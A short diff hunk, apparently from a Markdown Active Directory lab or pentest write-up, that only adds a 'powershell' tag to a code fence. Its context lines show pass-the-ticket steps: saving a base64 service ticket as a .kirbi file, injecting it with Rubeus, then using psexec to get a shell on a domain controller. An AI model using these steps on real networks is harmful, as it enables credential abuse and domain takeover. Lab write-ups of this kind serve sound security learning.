@@ -247,6 +247,6 @@ C:\Users\Alex> echo <base64ServiceTicket> > C:\Users\Alex\Desktop\ticket.kirbi
 C:\Users\Alex> .\Rubeus.exe ptt /ticket:C:\Users\Alex\Desktop\ticket.kirbi
 ```
 Access the dc via psexec
-```
+```powershell
 C:\Users\Alex\Desktop> psexec.exe \\dc.dev.dhitalcorp.local cmd
 ```
